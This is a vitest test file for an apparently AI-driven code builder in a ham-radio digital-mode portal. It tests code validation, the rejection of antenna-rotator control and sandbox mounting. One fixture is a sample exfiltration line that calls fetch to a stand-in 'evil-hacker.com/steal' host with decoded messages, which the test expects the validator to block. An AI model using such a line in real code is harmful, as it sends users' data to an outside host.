import { describe, expect, it } from "vitest";
import { ComponentValidator } from "../src/portal/agents/validator.js";
import { BuilderAgent } from "../src/portal/agents/builder.js";
import { AgentOrchestrator } from "../src/portal/agents/orchestrator.js";
import { BuilderPanelController } from "../src/portal/public/builder-panel.js";
import { PeripheryHostBridge, type SandboxRpcMessage } from "../src/portal/sandbox/bridge.js";
import { createCoreClient, MockTransportAdapter } from "../core/client/index.js";

describe("Dual-Agent Builder & Validator System (U7, R12, R13, R14, R16, F2, F3, AE2)", () => {
  it("ComponentValidator verifies valid CoreClient invocations", () => {
    const validator = new ComponentValidator();
    const validCode = `
      digiDx.on('decode', function(decode) {
        if (decode.message.includes('CQ')) {
          digiDx.transmit({ af: 1500, slot: 'even', message: 'K1ABC W1AW FN31' });
        }
      });
      digiDx.cancelTransmit();
      digiDx.haltTx();
    `;

    const report = validator.validateCode(validCode);
    expect(report.valid).toBe(true);
    expect(report.errors).toHaveLength(0);
    expect(report.callsDetected).toContain("on");
    expect(report.callsDetected).toContain("transmit");
    expect(report.callsDetected).toContain("cancelTransmit");
    expect(report.callsDetected).toContain("haltTx");
  });

  it("ComponentValidator blocks prohibited network globals (R10)", () => {
    const validator = new ComponentValidator();
    const maliciousCode = `
      digiDx.on('decode', function(d) {
        fetch('https://evil-hacker.com/steal?data=' + encodeURIComponent(d.message));
      });
    `;

    const report = validator.validateCode(maliciousCode);
    expect(report.valid).toBe(false);
    expect(report.errors.some((e) => e.type === "prohibited_global" && e.identifier === "fetch")).toBe(true);
    expect(report.errors[0]?.message).toContain("Direct network egress via 'fetch' is prohibited");
  });

  it("ComponentValidator rejects unsupported capability and provides alternative (AE2)", () => {
    const validator = new ComponentValidator();
    const rotatorCode = `
      digiDx.on('decode', function(d) {
        if (d.message.includes('VK')) {
          digiDx.rotateAntenna(180);
        }
      });
    `;

    const report = validator.validateCode(rotatorCode);
    expect(report.valid).toBe(false);
    expect(report.errors.some((e) => e.identifier === "rotateAntenna")).toBe(true);
    expect(report.errors[0]?.alternative).toContain("visual heading alert card");
  });

  it("AgentOrchestrator handles AE2: rejects antenna rotator request and proposes visual alternative", async () => {
    const orchestrator = new AgentOrchestrator();

    // Operator requests antenna rotator control (AE2)
    const result = await orchestrator.processRequest(
      "Automatically rotate my directional beam antenna to 180 degrees when VK stations are heard"
    );

    expect(result.status).toBe("rejected_with_alternatives");
    expect(result.explanation).toContain("cannot generate code to control your antenna_rotator");
    expect(result.suggestedAlternative).toContain("visual heading alert card");
  });

  it("AgentOrchestrator approves blank-slate priority queue request (F2)", async () => {
    const orchestrator = new AgentOrchestrator();

    const result = await orchestrator.processRequest(
      "I want a priority queue of stations answering my CQ ranked by distance, and a clean transmit sequencer",
      { mode: "blank_slate" }
    );

    expect(result.status).toBe("approved");
    expect(result.code).toBeDefined();
    expect(result.validation.valid).toBe(true);
    expect(result.code).toContain("digiDx.on('decode'");
  });

  it("BuilderPanelController connects operator chat to runtime mounting (R16, AE4)", async () => {
    const transport = new MockTransportAdapter();
    const coreClient = createCoreClient(transport);

    const sentToSandbox: SandboxRpcMessage[] = [];
    const bridge = new PeripheryHostBridge({
      coreClient,
      postMessageToSandbox: (m) => sentToSandbox.push(m)
    });

    const orchestrator = new AgentOrchestrator();
    const panel = new BuilderPanelController(orchestrator, bridge);

    expect(panel.history).toHaveLength(1); // System welcome message

    // Operator asks to add audio beep on 73 (AE4)
    const reply = await panel.sendUserPrompt("Add an audio beep whenever someone sends 73 to me");

    expect(reply.sender).toBe("agent");
    expect(reply.text).toContain("Added an audio beep notification");
    expect(panel.history).toHaveLength(3); // System, User, Agent

    // Verified that approved code was automatically mounted into sandbox runtime
    const mountMsg = sentToSandbox.find((m) => m.type === "mount_policy");
    expect(mountMsg).toBeDefined();
    expect(mountMsg?.code).toContain("BEEP: 73 received");

    bridge.dispose();
  });
});
